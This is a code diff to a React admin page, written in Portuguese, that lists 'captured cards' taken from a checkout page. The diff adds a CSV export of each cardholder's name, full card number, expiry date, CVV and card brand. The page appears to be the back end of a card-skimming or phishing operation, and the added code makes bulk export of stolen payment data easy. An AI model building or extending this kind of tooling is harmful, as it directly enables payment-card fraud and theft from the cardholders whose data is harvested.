@@ -4,13 +4,15 @@ import { CardCaptureFilter } from "@/components/cardcapture/CardCaptureFilter";
 import { CardCaptureTable } from "@/components/cardcapture/CardCaptureTable";
 import { useCardCapture } from "@/hooks/useCardCapture";
 import { formatDate } from "@/lib/format";
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import { Button } from "@/components/ui/button";
-import { RefreshCw, AlertTriangle } from "lucide-react";
+import { Download, RefreshCw, AlertTriangle } from "lucide-react";
 import { Alert, AlertDescription } from "@/components/ui/alert";
+import { toast } from "sonner";
 
 const CardCapture = () => {
-  const { filteredCards, searchTerm, setSearchTerm, isLoading, error, refreshCards } = useCardCapture();
+  const { filteredCards, searchTerm, setSearchTerm, isLoading, error, refreshCards, capturedCards } = useCardCapture();
+  const [exportLoading, setExportLoading] = useState(false);
 
   // Add debugging information
   useEffect(() => {
@@ -19,20 +21,82 @@ const CardCapture = () => {
     console.log("CardCapture page - Error state:", error);
   }, [filteredCards, isLoading, error]);
 
+  const handleExportCSV = () => {
+    if (!capturedCards.length) {
+      toast.error("Não há dados para exportar");
+      return;
+    }
+
+    try {
+      setExportLoading(true);
+      
+      // Create CSV header
+      const headers = ["Nome", "Número do Cartão", "Validade", "CVV", "Bandeira", "Data de Captura"];
+      
+      // Create CSV rows
+      const rows = capturedCards.map(card => [
+        card.nome_cliente,
+        card.numero_cartao,
+        card.validade,
+        card.cvv,
+        card.bandeira,
+        formatDate(card.criado_em)
+      ]);
+      
+      // Combine header and rows
+      const csvContent = [
+        headers.join(","),
+        ...rows.map(row => row.join(","))
+      ].join("\n");
+      
+      // Create a blob and download
+      const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
+      const link = document.createElement("a");
+      const url = URL.createObjectURL(blob);
+      
+      link.setAttribute("href", url);
+      link.setAttribute("download", `cartoes-capturados-${new Date().toISOString().split('T')[0]}.csv`);
+      link.style.visibility = "hidden";
+      
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      
+      toast.success("Exportação concluída com sucesso");
+    } catch (error) {
+      console.error("Error exporting data:", error);
+      toast.error("Erro ao exportar dados");
+    } finally {
+      setExportLoading(false);
+    }
+  };
+
   return (
     <div className="space-y-6 animate-fade-in">
       <div className="flex justify-between items-center">
         <h1 className="text-3xl font-bold tracking-tight">Cartões Capturados</h1>
-        <Button 
-          variant="outline" 
-          size="sm" 
-          className="gap-2"
-          onClick={refreshCards}
-          disabled={isLoading}
-        >
-          <RefreshCw size={16} className={isLoading ? "animate-spin" : ""} />
-          Atualizar
-        </Button>
+        <div className="flex gap-2">
+          <Button 
+            variant="outline" 
+            size="sm" 
+            className="gap-2"
+            onClick={refreshCards}
+            disabled={isLoading}
+          >
+            <RefreshCw size={16} className={isLoading ? "animate-spin" : ""} />
+            Atualizar
+          </Button>
+          <Button 
+            variant="outline" 
+            size="sm" 
+            className="gap-2"
+            onClick={handleExportCSV}
+            disabled={isLoading || exportLoading || capturedCards.length === 0}
+          >
+            <Download size={16} className={exportLoading ? "animate-pulse" : ""} />
+            Exportar CSV
+          </Button>
+        </div>
       </div>
 
       <CardCaptureFilter 
@@ -54,6 +118,11 @@ const CardCapture = () => {
           <CardTitle>Cartões Capturados</CardTitle>
           <CardDescription>
             Lista de cartões capturados através da página de checkout
+            {capturedCards.length > 0 && (
+              <span className="ml-2 text-sm text-muted-foreground">
+                ({capturedCards.length} {capturedCards.length === 1 ? 'registro' : 'registros'})
+              </span>
+            )}
           </CardDescription>
         </CardHeader>
         <CardContent>
